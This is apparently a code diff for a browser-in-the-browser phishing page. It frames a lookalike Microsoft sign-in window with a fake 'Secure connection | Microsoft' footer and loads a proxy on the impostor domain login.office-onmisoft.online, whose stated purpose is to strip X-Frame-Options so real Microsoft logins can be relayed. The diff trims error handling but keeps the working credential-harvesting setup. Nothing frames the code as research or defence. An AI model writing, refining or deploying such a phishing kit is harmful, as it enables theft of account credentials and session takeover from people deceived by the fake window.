@@ -69,14 +69,6 @@
             z-index: 9999;
         }
         .close-btn:hover { background: rgba(255,0,0,0.8); }
-        .error-msg {
-            padding: 20px;
-            text-align: center;
-            color: #d32f2f;
-            background: #ffebee;
-            border-radius: 8px;
-            margin: 20px;
-        }
     </style>
 </head>
 <body>
@@ -94,36 +86,18 @@
         <div class="browser-footer">🔒 Secure connection | Microsoft</div>
     </div>
     <script>
-        // ✅ FIX: Use the proxy URL so X-Frame-Options is stripped
+        // ✅ FIX: Use the PROXY URL, not Microsoft directly
         const PROXY_URL = 'https://login.office-onmisoft.online/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/';
         
         const params = new URLSearchParams(window.location.search);
         let targetUrl = params.get('url') || PROXY_URL;
         
-        // If the URL is not a full URL, make it one
         if (!targetUrl.startsWith('http')) {
             targetUrl = 'https://' + targetUrl;
         }
         
-        // Display the URL
         document.getElementById('urlDisplay').textContent = targetUrl;
-        
-        // Load the URL in the iframe
-        const iframe = document.getElementById('bitbFrame');
-        iframe.src = targetUrl;
-        
-        // Handle iframe load errors
-        iframe.onerror = function() {
-            document.getElementById('urlDisplay').textContent = '⚠️ Failed to load: ' + targetUrl;
-        };
-        
-        // Also try loading after a short delay (for CORS issues)
-        setTimeout(() => {
-            if (iframe.contentWindow === null) {
-                // Iframe didn't load, try reloading
-                iframe.src = targetUrl;
-            }
-        }, 2000);
+        document.getElementById('bitbFrame').src = targetUrl;
     </script>
 </body>
 </html>
